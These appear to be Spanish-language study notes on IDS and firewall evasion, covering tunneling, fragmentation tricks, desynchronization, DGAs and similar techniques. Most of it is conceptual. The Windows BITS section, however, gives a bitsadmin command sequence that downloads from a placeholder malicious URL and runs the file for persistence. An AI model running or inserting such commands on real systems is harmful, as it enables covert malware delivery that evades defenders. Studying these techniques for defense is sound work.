**IDS/Firewall Evasion Techniques**

Técnicas como la ofuscación de cargas útiles, el cifrado de los canales de comunicación y el aprovechamiento de vulnerabilidades de día cero son comúnmente empleadas para eludir estas defensas. Comprender estos métodos de evasión es crucial para los profesionales de seguridad, ya que les permite fortalecer sus defensas, desarrollar firmas de IDS más resistentes y configurar los firewalls para detectar y bloquear patrones de ataque sofisticados de manera más efectiva.

**Some IDS/firewall bypassing techniques :**
▪ Port Scanning
▪ Firewalking
▪ Banner Grabbing
▪ IP Address Spoofing
▪ Source Routing
▪ Tiny Fragments
▪ Using an IP Address in Place of a URL
▪ Using Anonymous Website Surfing Sites
▪ Using a Proxy Server
▪ ICMP Tunneling
▪ ACK Tunneling
▪ HTTP Tunneling
▪ SSH Tunneling
▪ DNS Tunneling
▪ Through External Systems
▪ Through MITM Attack
▪ Through Content
▪ Through XSS Attack
▪ Through HTML Smuggling
▪ Through Windows BITS
  
#### **Firewalking**

 ==Consiste en enviar paquetes TCP o UDP al firewall, donde el valor TTL es un salto mayor que el firewall objetivo.== Si el paquete atraviesa el gateway, el sistema lo reenvía al siguiente salto, donde el TTL es igual a uno, y genera un mensaje de error ICMP en el punto de rechazo con el mensaje "TTL exceeded in transit". ==Este método ayuda a localizar un firewall; el sondeo adicional facilita la huella digital (fingerprinting) y la identificación de vulnerabilidades==. ==**Firewalk** es una aplicación bien conocida utilizada para este propósito. Tiene dos fases: una fase de descubrimiento de red y una fase de escaneo.==. ==Nmap también tiene un script de firewalk que se puede utilizar para realizar esta técnica.== Los scripts de Firewalk y Nmap proporcionan información crítica sobre las configuraciones de red y las reglas de firewall que pueden ser aprovechadas para eludir medidas de seguridad, incluidos los IDS, cuando se combinan con otras técnicas de evasión. ==Este método permite ubicar un firewall, y mediante sondeos adicionales, facilita el análisis de su "huella" (fingerprinting) e identificación de vulnerabilidades==

**▪ Banner Grabbing**

==Los atacantes suelen utilizar herramientas como Netcat, Telnet, Nmap o curl para realizar banner grabbing, ya que estas permiten enviar solicitudes simples y capturar las respuestas que contienen los banners. La información extraída se convierte en una valiosa fuente de inteligencia para planificar ataques dirigidos, especialmente cuando se busca evadir IDS y otros mecanismos de seguridad.==

**▪ IP Address Spoofing**
Este método consiste en **alterar la dirección IP de origen** en los encabezados de los paquetes para ocultar la verdadera identidad del atacante y eludir las medidas de seguridad.Los firewalls y los IDS suelen filtrar los paquetes basándose en sus direcciones IP de origen para determinar si provienen de fuentes legítimas o no. Los atacantes crean paquetes IP con direcciones IP de origen falsificadas, haciendo que parezca que los paquetes se originan desde un host confiable

**▪ Source Routing**

==El **source routing** es una técnica mediante la cual el remitente de un paquete **especifica parcial o completamente la ruta** que el paquete debe seguir a través de la red, en lugar de dejar que cada enrutador en el camino decida dinámicamente el siguiente salto.==

**▪ Tiny Fragments**  

==Los atacantes **dividen intencionalmente los paquetes salientes en fragmentos muy pequeños**, de modo que parte del encabezado TCP se coloca en fragmentos posteriores. Esta técnica se emplea para **dificultar la tarea del sistema de detección de intrusos (IDS) de reensamblar todo el flujo de tráfico, lo cual es necesario para detectar de manera efectiva patrones maliciosos.**==

**Bypass Blocked Sites Using an IP Address in Place of a URL**

==Consiste en ingresar directamente la dirección IP de un sitio web bloqueado en la barra de direcciones del navegador,== en lugar de usar su nombre de dominio (URL).

**Bypass Blocked Sites Using Anonymous Website Surfing Sites**

==La navegación anónima a través de sitios web proxy es una técnica utilizada para evadir restricciones de firewall y acceder a sitios bloqueados sin revelar la dirección IP real del usuario.==

**Anonymize VPN Source: https://anonymize.com**

Dirige todo el tráfico de Internet a través de un túnel cifrado, lo que significa que toda la información que envías y recibes está protegida frente a terceros, incluyendo proveedores de Internet, piratas informáticos o incluso sistemas de vigilancia gubernamental.

**Some online anonymizers include:**
**▪ https://anonymize.com**
**▪ https://2ip.io/anonim**
**▪ https://www.kproxy.com**
**▪ https://zendproxy.com**
**▪ https://proxify.com**
**▪ https://www.proxysite.com**
**▪ http://anonymouse.org**
**▪** **https://proxyscrape.com**

**Bypassing an IDS/Firewall through the ICMP Tunneling Method**

**==Permite el túnel de una shell de puerta trasera en la parte de datos de los paquetes ICMP Echo.** El RFC 792, que define el funcionamiento de ICMP, no especifica qué debe incluirse en la parte de datos. La porción de carga útil es arbitraria y no es examinada por la mayoría de los firewalls o IDS.== ==Por lo tanto, se puede insertar cualquier tipo de dato en la parte de carga útil del paquete ICMP, incluida una aplicación de puerta trasera.==

**Bypassing an IDS/Firewall through the ACK Tunneling method**

==Los atacantes pueden **inyectar cargas maliciosasen los paquetes ACK aprovechando el hecho de que estos suelen ser menos inspeccionados.**  Mediante el uso de un túnel de una aplicación de puerta trasera a través de paquetes TCP con el bit **ACK** activado, los atacantes pueden **burlar el firewall** y, potencialmente, **evadir la detección del IDS**.==

**Bypassing an IDS/Firewall through the HTTP Tunneling Method**

Este método se puede implementar si la empresa objetivo tiene un servidor web público en el que el puerto 80 se utiliza para el tráfico HTTP, el cual no está filtrado por su firewall. ==El atacante encapsula datos dentro del tráfico HTTP (a través del puerto 80). Muchos firewalls, incluidos los IDS, no examinan el contenido del paquete HTTP para confirmar que sea legítimo. Por lo tanto, es posible túnelizar tráfico a través del puerto TCP 80.==

**HTTP Tunneling Tools**

**▪ HTTPort and HTTHost** 
Source: https://www.targeted.org

**Bypassing Firewalls through the SSH Tunneling Method**

==La tunelización del protocolo SSH implica enviar tráfico de red no cifrado a través de un túnel SSH. Los datos no cifrados pueden enviarse a través del protocolo SSH cifrado utilizando la tunelización SSH==. Los atacantes emplean esta técnica para eludir las restricciones del IDS/firewall. ==Se conectan a servidores SSH externos y crean túneles SSH hacia el puerto 80 en el servidor remoto, eludiendo así las restricciones. Los atacantes utilizan OpenSSH (OpenBSD Secure Shell) para cifrar y túnelizar todo el tráfico desde una máquina local hacia una máquina remota, evitando así la detección por parte de los controles de seguridad perimetrales==. OpenSSH es un conjunto de programas informáticos que proporcionan sesiones de comunicación cifradas a través de una red de computadoras utilizando el protocolo SSH.

**Example: 
ssh –f user@certifiedhacker.com –L 5000:certifiedhacker.com:25 –N**

**-f => background mode, user@certifiedhacker.com => username and server you are logging into, –L 5000:certifiedhacker.com:25 => local-port:host:remote-port, and -N => Do not execute the command on the remote system.**

**Performing SSH Tunneling for Bypassing Firewalls Using Bitvise**

**Source****:** [**https://www.bitvise.com**](https://www.bitvise.com)

El servidor SSH de Bitvise proporciona capacidades de inicio de sesión remoto seguro a estaciones de trabajo y servidores Windows, cifrando los datos durante su transmisión. Es ideal para la administración remota de servidores Windows, para usuarios avanzados que deseen acceder a su máquina doméstica desde el trabajo o a su máquina del trabajo desde casa, y para una amplia gama de tareas avanzadas, como establecer una VPN mediante la función de tunelización TCP/IP por SSH o proporcionar un depósito seguro de archivos mediante SFTP.

**Bypassing Firewalls through the DNS Tunneling Method**

**DNS Tunneling using iodine**
### ==▪ iodine==

Source: [https://code.kryo.se](https://code.kryo.se)

==Iodine es un programa que permite el tunelizado de datos IPv4 a través de un servidor DNS. Los atacantes pueden usar esta herramienta en situaciones donde el acceso a Internet está restringido por un firewall==, pero se permiten consultas DNS. La herramienta iodine incluye dos archivos ejecutables:

**iodined (servidor):**Este componente se ejecuta en un servidor con una dirección IP pública. Es responsable de responder a las consultas DNS. Decodifica los datos enviados desde el cliente, accede a Internet en nombre del cliente y codifica las respuestas en respuestas DNS.

**iodine (cliente):**Este componente se ejecuta en el dispositivo del cliente. Intercepta el tráfico de Internet saliente y lo codifica en consultas DNS enviadas a un servidor iodined.

##### **Bypassing an IDS/Firewall through MITM Attacks** 
==En los ataques MITM, los atacantes utilizan servidores DNS y técnicas de enrutamiento para eludir las restricciones del firewall/IDS. Pueden tomar el control del servidor DNS corporativo o falsificar respuestas DNS para llevar a cabo el ataque MITM.==

##### **Bypassing an IDS/Firewall through Content** 
==En este método, el atacante envía contenido que contiene código malicioso al usuario y lo engaña para que lo abra, de modo que el código malicioso pueda ejecutarse.El atacante utiliza técnicas de esteganografía u ofuscación para ocultar código malicioso dentro de archivos legítimos.El código malicioso está diseñado para evadir la detección del IDS y burlar las reglas del firewall.==

##### **Bypassing an IDS/WAF using an XSS Attack** 
El ataque XSS explota vulnerabilidades que ocurren al procesar los parámetros de entrada de los usuarios finales y las respuestas del servidor en una aplicación web.Los atacantes aprovechan estas vulnerabilidades para inyectar código HTML malicioso en el sitio web de la víctima con el fin de evadir el IDS/WAF.

##### **Bypassing an IDS/Firewall through HTML Smuggling** 
HTML smuggling es un ==tipo de ataque web en el que un atacante inyecta código malicioso en un script HTML para comprometer una página web. Este ataque permite a los atacantes manipular las características de los códigos de scripting (HTML5, JavaScript, etc.) y mantenerse ocultos de soluciones SIEM, firewalls, proxies web y gateways de correo electrónico.==


##### **Evading an IDS/Firewall through Windows BITS**

==En un entorno Windows, el **Background Intelligent Transfer Service (BITS)** es un servicio estándar utilizado para distribuir actualizaciones automáticas de Windows a sus usuarios a nivel mundial. A pesar de sus ventajas, el servicio BITS también puede ser explotado por atacantes para evadir firewalls y sistemas de detección de intrusos (IDS)==, ==ya que muchas organizaciones tienden a ignorar el tráfico de BITS debido a que se percibe como un flujo constante y legítimo de actualizaciones de software. Este servicio permite que navegadores como Firefox y Chrome continúen descargando e instalando sus versiones más recientes, incluso si el navegador está cerrado.==

**Las transferencias de BITS son asíncronas, lo que significa que el programa que creó la tarea puede no estar activo cuando se completa la transferencia solicitada**.Las tareas de BITS pueden establecerse mediante la interfaz basada en comandos bitsadmin o a través de llamadas a funciones de la API.

**bitsadmin /create persistence**

**bitsadmin /addfile persistence \<URL maliciosa\> \<Ruta local\>**

**bitsadmin /SetNotifyCmdLine persistence \<Ruta local\> NULL**

**bitsadmin /resume persistence**

#### Other Techniques for IDS Evasion

**Some IDS evasion techniques :**
▪ Insertion Attack
▪ Evasion
▪ DoS Attack
▪ Obfuscating
▪ False Positive Generation
▪ Session Splicing
▪ Unicode Evasion
▪ Fragmentation Attack
▪ Time-To-Live Attacks
▪ Urgency Flag
▪ Invalid RST Packets
▪ Polymorphic Shellcode
▪ ASCII Shellcode
▪ Application-Layer Attacks
▪ Desynchronization
▪ Domain Generation Algorithms (DGA)
▪ Encryption
▪ Flooding

##### **Insertion Attack** 
==La inserción es el proceso mediante el cual el atacante confunde al IDS al obligarlo a leer paquetes inválidos (es decir, el sistema puede no aceptar el paquete que se le envió). Un IDS confía ciegamente y acepta un paquete que un sistema final rechaza. Si un paquete está mal formado o no llega a su destino real, el paquete es inválido. Si el IDS lee un paquete inválido, se confunde.== Un atacante explota esta condición e inserta datos en el IDS. Este ataque ocurre cuando el NIDS es menos estricto al procesar paquetes que la red interna. El atacante oculta tráfico extra y el IDS concluye que el tráfico es inofensivo. Por lo tanto, el IDS recibe más paquetes que el destino. Para entender por qué la inserción es un problema para un IDS de red, es importante comprender cómo el IDS detecta ataques.

##### **Evasion**

==Ocurre cuando el sistema de detección de intrusiones (IDS) descarta paquetes mientras que el host que debe recibirlos los acepta. El atacante envía porciones de la solicitud en paquetes que el IDS rechaza erróneamente, lo que permite que se eliminen partes del flujo de la vista del sistema IDS. Si el atacante envía una secuencia maliciosa byte por byte, y si el IDS rechaza solo un byte, no podrá detectar el ataque. Aquí, el IDS recibe menos paquetes que el destino real.==

##### **Denial-of-Service Attack (DoS)**

==Los atacantes pueden monitorizar y atacar las capacidades de la CPU del IDS==. Esto es porque el IDS necesita una fracción de un ciclo de CPU para leer los paquetes, detectar su propósito y luego compararlos con algunos datos guardados en el estado de la red. ==Un atacante puede identificar las operaciones de procesamiento de red que son más costosas en términos computacionales y luego obligar al IDS a gastar todo su tiempo en realizar tareas inútiles==. ==Si los atacantes conocen la dirección IP del servidor de registros centralizados, podrían ralentizarlo o incluso derribarlo mediante un ataque DoS==. Después de apagar el servidor, los ataques podrían pasar desapercibidos porque los datos de alertas ya no se registran.

##### **Obfuscating**

La ofuscación significa hacer que el código sea más difícil de entender o leer, generalmente con fines de privacidad o seguridad. Una herramienta llamada "ofuscador" convierte un programa directo en uno que funciona de la misma manera, pero que es mucho más difícil de entender.Un atacante manipula la ruta referenciada en la firma para engañar al HIDS. Usando caracteres Unicode, un atacante puede codificar los paquetes de ataque de forma que el IDS no los reconozca, pero que un servidor web IIS pueda decodificar.

##### **False Positive Generation**

==Otro ataque similar al método DoS es crear una gran cantidad de datos de alerta que el IDS registrará. Los atacantes construyen paquetes maliciosos que se sabe que activan alertas dentro del IDS, lo que obliga a este a generar una gran cantidad de falsos informes. Tal ataque crea una gran cantidad de "ruido" en los registros, con el fin de mezclar ataques reales con falsos. Los atacantes saben que al revisar los datos de los registros, puede ser difícil diferenciar entre ataques legítimos y falsos positivos==

##### **Session Splicing**

Explota cómo algunos IDS no reconstruyen las sesiones antes de hacer la comparación de patrones en los datos. ==Es un método de evasión **a nivel de red** utilizado para eludir un IDS donde un atacante divide el tráfico de ataque en un número excesivo de paquetes, de manera que ninguno de ellos activa el IDS. El atacante divide los datos en los paquetes en pequeñas porciones de unos pocos bytes y evade la comparación de cadenas mientras entrega los datos. El IDS no puede manejar un número excesivo de paquetes de tamaño pequeño y falla al detectar las firmas del ataque.==

##### **Unicode Evasion Technique**

==Los atacantes pueden usar estos puntos de código Unicode para modificar las cadenas de texto de tal forma que el sistema o el IDS no detecten los patrones de ataque.== Este tipo de evasión se basa en el uso de diferentes representaciones de los mismos caracteres para confundir al IDS, permitiendo que el ataque pase desapercibido.

**For Example:** 
In UTF-16, the character “/” can be represented as “%u2215” and “e” as “%u00e9”; in UTF-8, “©” can be represented as “%c2%a9” and “≠” as “%e2%89%a0.” 

**Fragmentation Attack**

==Los atacantes pueden aprovechar la fragmentación al utilizar el tiempo de espera para el reensamblaje de fragmentos, el cual varía de un sistema a otro. Esto permite que los paquetes sean fragmentados y enviados en fragmentos más pequeños, de manera que el IDS no pueda reconocer la amenaza mientras está esperando que los fragmentos se reensamblen. La diferencia en los tiempos de espera de reensamblaje entre el IDS y los sistemas de destino puede hacer que los paquetes maliciosos pasen desapercibidos, lo que permite a los atacantes eludir la detección.==

**Escenario 1**

Supongamos que el tiempo de espera para la fragmentación en el IDS es de 10 segundos, mientras que en el sistema de destino es de 20 segundos. Los atacantes enviarán el segundo fragmento 15 segundos después de haber enviado el primero. En este escenario, el IDS descartará el fragmento cuando reciba el segundo fragmento, ya que este se envía después del tiempo de espera para reensamblaje del IDS, pero el sistema de destino continuará con el proceso de reensamblaje.

**Escenario 2**

**Fragmentación del Paquete de Ataque:·**  

El atacante fragmenta el paquete malicioso en cuatro fragmentos: frag-1, frag-2, frag-3 y frag-4.

El IDS tiene un tiempo de espera para la reensamblaje de fragmentos de 60 segundos, mientras que el sistema víctima tiene un tiempo de espera de 30 segundos.

**Envío de Fragmentos con Carga Útil Falsa:·**  

El atacante primero envía frag-2' y frag-4' (fragmentos con carga útil falsa) tanto al IDS como a la víctima.

Ambos sistemas recibirán estos fragmentos, pero dado que la víctima no ha recibido frag-1, descartará frag-2' y frag-4' sin generar un mensaje de error ICMP (ya que el fragmento no puede ser reensamblado todavía).

**Envío de Fragmentos con Carga Útil Válida:**  

Después de que ocurra el tiempo de espera para el reensamblaje en el sistema víctima, el atacante envía frag-1 y frag-3 (fragmentos con carga útil legítima).

En este punto, la víctima solo tendrá frag-1 y frag-3, mientras que el IDS habrá recibido frag-1, frag-2', frag-3 y frag-4'.

El IDS intentará reensamblar los fragmentos, pero como frag-2' y frag-4' tienen cargas útiles falsas, el reensamblaje fallará y el IDS descartará el paquete.

Reenvío de los Fragmentos Correctos:  

El atacante luego envía frag-2 y frag-4 nuevamente, esta vez con cargas útiles válidas.

Ahora, el IDS recibirá frag-2 y frag-4 con cargas útiles válidas, pero debido a que los fragmentos anteriores (frag-1 y frag-3) ya fueron descartados por tener sumas de comprobación inválidas, el IDS no podrá reensamblar con éxito el paquete completo.

**Reensamblaje Exitoso en la Víctima:**  

El sistema víctima ahora tendrá frag-1, frag-3, frag-2 y frag-4, todos con cargas útiles válidas.

El sistema víctima reensamblará con éxito los fragmentos en el paquete de ataque completo y lo procesará, ejecutando el ataque.


##### **Time-To-Live Attacks**

Cada paquete IP tiene un campo llamado _Time to Live_ (TTL), que indica cuántos saltos puede realizar el paquete antes de que un nodo de red lo descarte. Cada router en la ruta de datos disminuye este valor en 1. Cuando el TTL llega a 0, el paquete se descarta y se envía una notificación ICMP al remitente.Normalmente, cuando un host envía un paquete, establece el TTL en un valor alto para asegurar que llegue a su destino en condiciones normales. ==Diferentes sistemas operativos usan valores iniciales distintos para el TTL. Por ello, los atacantes pueden adivinar cuántos routers hay entre ellos y una máquina emisora, y hacer suposiciones sobre cuál fue el TTL inicial.Para evitar este tipo de detección==, herramientas como **_SmartDefense_ pueden modificar el campo TTL de todos los paquetes** (o solo de los paquetes salientes) a un número predeterminado. **Estos ataques requieren que el atacante tenga conocimiento previo sobre la topología de la red de la víctima.**

##### **Urgency Flag**

Cuando el usuario activa la bandera de urgencia (URG), el protocolo TCP ignora todos los datos que están antes del puntero de urgencia, y procesa únicamente los datos a los que dicho puntero apunta. Los atacantes pueden colocar datos basura antes de los datos urgentes. ==El puntero de urgencia y el IDS leerán todos los datos, incluyendo los no urgentes, sin considerar cómo el host final maneja la urgencia. Esto provoca que el IDS tenga más datos disponibles que los que realmente procesa el sistema de destino.==

==Como resultado, el IDS y el sistema objetivo ven diferentes conjuntos de datos, lo que puede ser aprovechado por los atacantes para hacer pasar tráfico malicioso sin ser detectado.==

**Invalid RST Packets**

==**Los atacantes pueden aprovechar esta característica para evadir la detección enviando paquetes RST con una suma de verificación inválida.**== Esto puede hacer que el IDS deje de procesar el flujo de datos, ya que interpreta que la sesión de comunicación ha terminado.

**Polymorphic Shellcode**

==Los ataques con shellcode polimórfico incluyen múltiples firmas, lo que dificulta la detección de una firma específica. Los atacantes codifican la carga útil utilizando alguna técnica y colocan un decodificador antes de la carga útil. Como resultado, el shellcode se reescribe completamente cada vez que se envía, evadiendo así la detección.==

##### **ASCII Shellcode**

Los shellcodes en ASCII contienen únicamente caracteres del estándar ASCII. ==Este tipo de shellcode permite a los atacantes evadir las restricciones comunes de caracteres impuestas en el código de entrada de cadenas. Además, ayudan a los atacantes a evadir las firmas de detección por patrones de los IDS, ya que ocultan las cadenas de manera similar a los shellcodes polimórficos==.

### **Application-Layer Attacks**

==Los archivos multimedia como imágenes, audios y videos pueden comprimirse para que se transfieran rápidamente en fragmentos más pequeños. Los atacantes encuentran fallas en estos datos comprimidos y ejecutan ataques; incluso las firmas de los IDS no pueden identificar el código malicioso dentro de los datos comprimidos.==

**Desynchronization**

**▪ Pre-Connection SYN**

==Los atacantes envían paquetes SYN falsos con un número de secuencia completamente inválido para desincronizar al IDS. Esto hace que el IDS deje de monitorear todo el tráfico legítimo y malicioso. Si el IDS es avanzado, no revisa la suma de verificación TCP. Si el IDS sí la revisa, el ataque se sincroniza y se envía un número de secuencia falso al IDS antes de que ocurra la conexión real.==

**▪ Post-Connection SYN**

==los atacantes intentan desincronizar al IDS de los números de secuencia reales que el kernel está reconociendo. Se envía un paquete SYN después de que ya se ha establecido la conexión, dentro del flujo de datos. Este paquete tendrá números de secuencia divergentes pero, por lo demás, cumplirá con todos los criterios necesarios para ser aceptado por el host de destino==. Sin embargo, el host de destino ignorará este paquete SYN, ya que hace referencia a una conexión que ya está establecida. El objetivo de este ataque es hacer que el IDS resincronice su noción de los números de secuencia con el nuevo paquete SYN

==**Domain Generation Algorithms (DGA)**==

Un algoritmo de generación de dominios (DGA, por sus siglas en inglés) es un programa de software que los atacantes pueden emplear para generar numerosos nombres de dominio nuevos y ejecutar código malicioso. Esta técnica también les permite cambiar de dominio con frecuencia y, de forma dinámica, identificar un dominio de destino para el tráfico de comando y control (C2), en lugar de depender de direcciones IP o dominios estáticos. Los DGA utilizan secuencias de caracteres para generar una gran cantidad de nombres de dominio aleatorios, que sirven como puntos de encuentro para que los atacantes se comuniquen con los servidores C2.

**Types of DGAs**
▪ Character-based DGAs
▪ Pseudorandom number generator (PRNG) DGAs
▪ Dictionary-based DGAs
▪ High-collision DGAs

#### **Encryption**

==Si un atacante logra establecer una sesión cifrada con su host objetivo utilizando un shell seguro (SSH), una capa de conexión segura (SSL) o un túnel de red privada virtual (VPN), el IDS no podrá analizar los paquetes que pasan a través de estas comunicaciones cifradas==

#### **Saturación (Flooding)**

==Para evadir la seguridad del IDS, los atacantes saturan sus recursos con ruido o tráfico falso para agotar su capacidad de análisis. Una vez que estos ataques tienen éxito, los atacantes pueden enviar tráfico malicioso hacia el sistema objetivo que se encuentra detrás del IDS, el cual ya ofrece poca o ninguna intervención==. De este modo, el tráfico de ataque real puede pasar desapercibido